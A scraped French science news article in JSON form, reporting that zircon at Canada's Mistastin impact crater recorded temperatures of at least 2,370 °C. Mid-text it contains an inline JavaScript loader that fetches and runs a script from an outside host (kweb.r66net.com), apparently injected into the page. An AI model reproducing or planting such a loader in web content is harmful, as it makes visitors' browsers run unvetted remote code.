{"title": "Un asteroide a l'origine du point le plus chaud ayant jamais existe sur Terre", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-09-20", "content": "Des chercheurs ont retrouve l'endroit ou il a fait le plus chaud a la surface de la Terre. A l'origine, un asteroide. Semblable evenement s'est produit des milliers de fois sur la Planete il y a quatre milliards d'annees. Avec quelles consequences ? Quelle a ete la temperature la plus elevee jamais enregistree a la surface de la  Terre  ? Une equipe de chercheurs des universites de l'Ouest a Londres (Ontario) et Curtin a Perth (Australie) ont trouve une reponse : au moins 2.370 degC, soit presque la moitie de la temperature qui regne a la surface du  Soleil  ! Voir aussi : Disparition des dinosaures : l'asteroide aurait plonge la Terre dans la nuit durant 2 ans Mais ou a-t-il fait si chaud ? C'etait dans le nord-ouest du Canada, dans la region du Labrador, lors de l'impact d'un  asteroide  il y a environ 36 millions d'annees. La trace de cet evenement qui, a l'epoque, a eu des consequences planetaires durant plusieurs decennies, est encore visible : un cratere de quelque 28 km de diametre -- le cratere Mistastin -- dont le centre est aujourd'hui occupe par le lac du meme nom de 16 km ou surnage une petite ile (creee par le rebond apres l'impact). Vue aerienne du lac Mistastin (16 km de diametre). (c) Google Maps                               La zircone cubique, un enregistreur des temperatures elevees  Pour obtenir ce resultat, l'equipe emmenee par Nicholas Timms s'est interessee aux mineraux trouves sur les parois du cratere (leurs presences sont autant d'indices d'un impact), et notamment a la  zircone , plus precisement l'oxyde de  zirconium  (ZrO 2 ). Selon les auteurs, preuve est faite que cette zircone fut presente sous une  forme cristalline  cubique. Or, celle-ci implique une temperature minimale de 2.370 degC.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Comme l'explique l'auteur principal de l'etude, publiee dans  Earth and Planetary Science Letters , interroge par  New Scientist  :  << personne auparavant n'avait meme envisage d'utiliser la zircone comme enregistreur des temperatures des  fontes  d'impact. C'est la premiere fois que nous avons une indication que de veritables roches peuvent etre aussi chaudes >> . Voir aussi : Asteroides : un risque accru de collision avec la Terre ? Au-dela du record  << de la temperature la plus elevee enregistree dans la  croute terrestre  >> , ces recherches montrent combien une region peut devenir en enfer immediatement apres l'impact d'un corps celeste. Mais, comme le soulevent les auteurs, paradoxalement, la vie sur cette planete doit peut-etre beaucoup a ces cataclysmes. Celui de Mistastin, assez recent et modere, etait plutot isole mais il y a quatre milliards d'annees, lors du  Grand bombardement tardif , les impacts etaient incessants (c'etait l'enfer sur Terre, une periode que l'on appelle l' Hadeen ). Ils ont joue un role majeur dans la formation et la composition de la croute terrestre, resurfacant la Planete et contribuant a la rendre habitable. Asteroides : pourquoi leur explosion ne suffirait pas a sauver la Terre                       On a deja vu, dans plusieurs films, des scientifiques faire exploser un geocroiseur pour eviter une collision avec notre planete. C'est sans doute le premier scenario qui nous viendrait aussi a l'esprit dans cette situation. Mais est-ce vraiment une solution viable ? Pas certain, selon Discovery Science. Voici en video un apercu de ce qui pourrait alors se passer.                                       ", "theme": "sciences"}